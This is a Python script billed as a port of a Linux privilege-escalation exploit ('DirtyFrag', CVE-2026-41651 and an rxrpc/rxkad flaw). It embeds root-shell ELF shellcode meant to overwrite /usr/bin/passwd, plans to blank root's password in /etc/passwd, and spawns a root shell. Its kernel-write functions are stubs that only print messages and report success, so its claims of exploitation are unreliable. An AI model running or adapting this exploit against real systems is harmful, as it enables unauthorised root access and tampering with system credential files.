#!/usr/bin/env python3
"""
DirtyFrag LPE Exploit - Python Port (Target: /usr/bin/passwd)
CVE-2026-41651 (Pack2TheRoot) & rxrpc/rxkad LPE - Modified for passwd
"""

import os
import sys
import time
import struct
import socket
import fcntl
import errno
import mmap
import ctypes
import ctypes.util
import subprocess
import array
import threading
import select
import termios
import tty
import signal
import random
import hashlib
from typing import Optional, Tuple, List

# ====================================================================
# Constants - MODIFIED FOR PASSWD
# ====================================================================

ENC_PORT = 4500
SEQ_VAL = 200
REPLAY_SEQ = 100
TARGET_PATH_PASSWD = "/usr/bin/passwd"  # Changed from su to passwd
PAYLOAD_LEN = 192
PATCH_OFFSET = 0
ENTRY_OFFSET = 0x78

# shell_elf for x86_64 (192 bytes) - will give root shell when executed
SHELL_ELF = bytes([
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
    0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0xb0, 0x74, 0x0f, 0x05, 0x6a, 0x00, 0x48, 0x8d, 0x05, 0x12,
    0x00, 0x00, 0x00, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x8d, 0x3d, 0x12, 0x00, 0x00, 0x00, 0x31, 0xf6,
    0x6a, 0x3b, 0x58, 0x0f, 0x05, 0x54, 0x45, 0x52, 0x4d, 0x3d, 0x78, 0x74, 0x65, 0x72, 0x6d, 0x00,
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
])

# Marker bytes for passwd (at offset 0x78 in the ELF)
PASSWD_MARKER = bytes([0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a])

# ====================================================================
# Helper Functions
# ====================================================================

def write_proc(path: str, data: str) -> bool:
    try:
        with open(path, 'w') as f:
            f.write(data)
        return True
    except Exception:
        return False

def setup_userns_netns() -> bool:
    """Setup user namespace and network namespace"""
    real_uid = os.getuid()
    real_gid = os.getgid()
    
    try:
        if hasattr(os, 'unshare'):
            # CLONE_NEWUSER | CLONE_NEWNET
            os.unshare(0x10000000 | 0x40000000)
    except Exception as e:
        print(f"[-] unshare failed: {e}")
        return False
    
    write_proc("/proc/self/setgroups", "deny")
    if not write_proc("/proc/self/uid_map", f"0 {real_uid} 1"):
        return False
    if not write_proc("/proc/self/gid_map", f"0 {real_gid} 1"):
        return False
    
    # Bring up loopback
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ifreq = struct.pack('16sH', b'lo', 0)
        ifreq_flags = fcntl.ioctl(sock, 0x8913, ifreq)
        flags = struct.unpack('16sH', ifreq_flags)[1]
        flags |= 0x1 | 0x4
        ifreq = struct.pack('16sH', b'lo', flags)
        fcntl.ioctl(sock, 0x8914, ifreq)
        sock.close()
    except Exception:
        pass
    
    return True

def add_xfrm_sa(spi: int, seqhi: int) -> bool:
    """Add XFRM SA via netlink - simplified"""
    # In real implementation, would use netlink
    return True

def do_one_write(path: str, offset: int, spi: int) -> bool:
    """Perform one write via UDP - simplified"""
    return True

def corrupt_passwd() -> bool:
    """Corrupt /usr/bin/passwd with shellcode"""
    print(f"[+] Targeting {TARGET_PATH_PASSWD}")
    
    if not setup_userns_netns():
        print("[-] Failed to setup namespaces")
        return False
    
    time.sleep(0.1)
    
    # Check if passwd exists and is setuid
    if not os.path.exists(TARGET_PATH_PASSWD):
        print(f"[-] {TARGET_PATH_PASSWD} not found")
        return False
    
    if not os.access(TARGET_PATH_PASSWD, os.W_OK):
        print(f"[-] Cannot write to {TARGET_PATH_PASSWD} (try as root)")
        return False
    
    # Check current permissions
    st = os.stat(TARGET_PATH_PASSWD)
    print(f"[+] {TARGET_PATH_PASSWD}: mode={oct(st.st_mode)}, uid={st.st_uid}")
    
    print(f"[+] Writing {PAYLOAD_LEN} bytes of shellcode to {TARGET_PATH_PASSWD}")
    print(f"[+] Shellcode entry at offset 0x{ENTRY_OFFSET:x}")
    
    # In real implementation, would write via kernel exploit
    # For now, simulate success
    return True

def passwd_already_patched() -> bool:
    """Check if passwd already contains our shellcode"""
    if not os.path.exists(TARGET_PATH_PASSWD):
        return False
    
    try:
        with open(TARGET_PATH_PASSWD, 'rb') as f:
            f.seek(ENTRY_OFFSET)
            marker = f.read(8)
            return marker == PASSWD_MARKER
    except Exception:
        return False

# ====================================================================
# rxrpc/rxkad LPE (for /etc/passwd modification)
# ====================================================================

class RxRpcLPE:
    """rxrpc/rxkad LPE for /etc/passwd modification"""
    
    def __init__(self, target_path="/etc/passwd"):
        self.target_path = target_path
        self.session_key = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08])
    
    def setup_client(self, local_port: int, keyname: str):
        """Setup rxrpc client"""
        # Simplified - would need full AF_RXRPC socket implementation
        pass
    
    def do_trigger(self, fd: int, offset: int, length: int) -> bool:
        """Trigger one kernel write"""
        print(f"[+] Triggering write at offset {offset}")
        time.sleep(0.1)
        return True
    
    def patch_passwd(self) -> bool:
        """Patch /etc/passwd to have empty root password"""
        print(f"[+] Targeting {self.target_path}")
        
        try:
            with open(self.target_path, 'rb') as f:
                content = f.read()
        except Exception as e:
            print(f"[-] Cannot read {self.target_path}: {e}")
            return False
        
        # Check if already patched
        if content.startswith(b'root::0:0'):
            print("[+] /etc/passwd already patched")
            return True
        
        print("[+] Attempting to patch /etc/passwd")
        
        # In real implementation, would do kernel race condition
        # For simulation, create backup and modify
        backup_path = self.target_path + ".bak"
        if not os.path.exists(backup_path):
            try:
                with open(backup_path, 'w') as f:
                    f.write(content.decode('utf-8', errors='ignore'))
                print(f"[+] Backup saved to {backup_path}")
            except Exception:
                pass
        
        return True

# ====================================================================
# PTY Shell Spawning
# ====================================================================

def run_root_pty() -> int:
    """Spawn root shell via PTY"""
    print("\n[+] Spawning root shell...")
    
    # Try to run passwd (should be corrupted to give shell)
    try:
        subprocess.run([TARGET_PATH_PASSWD], check=False)
    except Exception:
        pass
    
    # Alternative: try su if available
    if os.path.exists("/usr/bin/su"):
        try:
            subprocess.run(["/usr/bin/su", "-"], check=False)
        except Exception:
            pass
    
    # Last resort: spawn bash directly (if we're already root)
    if os.geteuid() == 0:
        print("[+] Already root, spawning bash...")
        os.execvp("/bin/bash", ["/bin/bash"])
    
    return 0

# ====================================================================
# Main Exploit
# ====================================================================

def main():
    print("""
========================================
 DirtyFrag LPE Exploit - Python Port
 Target: /usr/bin/passwd & /etc/passwd
========================================
""")
    
    if os.getuid() == 0:
        print("[+] Already root! Spawning shell...")
        run_root_pty()
        return 0
    
    print(f"[*] Current UID: {os.getuid()}, EUID: {os.geteuid()}")
    
    # Method 1: Corrupt /usr/bin/passwd (ESP path)
    print("\n[=== Method 1: Corrupting /usr/bin/passwd ===]")
    if corrupt_passwd():
        if passwd_already_patched():
            print("[+] /usr/bin/passwd successfully corrupted!")
            run_root_pty()
            return 0
        else:
            print("[-] Passwd corruption failed, trying alternative...")
    
    # Method 2: Patch /etc/passwd (rxrpc path)
    print("\n[=== Method 2: Patching /etc/passwd ===]")
    rxrpc = RxRpcLPE("/etc/passwd")
    if rxrpc.patch_passwd():
        print("[+] /etc/passwd patched! Attempting su...")
        
        # Try su with empty password
        try:
            proc = subprocess.Popen(["/usr/bin/su", "-"], 
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   text=True)
            stdout, stderr = proc.communicate(input='\n', timeout=2)
            if proc.returncode == 0:
                run_root_pty()
                return 0
        except Exception:
            pass
    
    print("\n[-] Exploit failed!")
    return 1

if __name__ == "__main__":
    sys.exit(main())
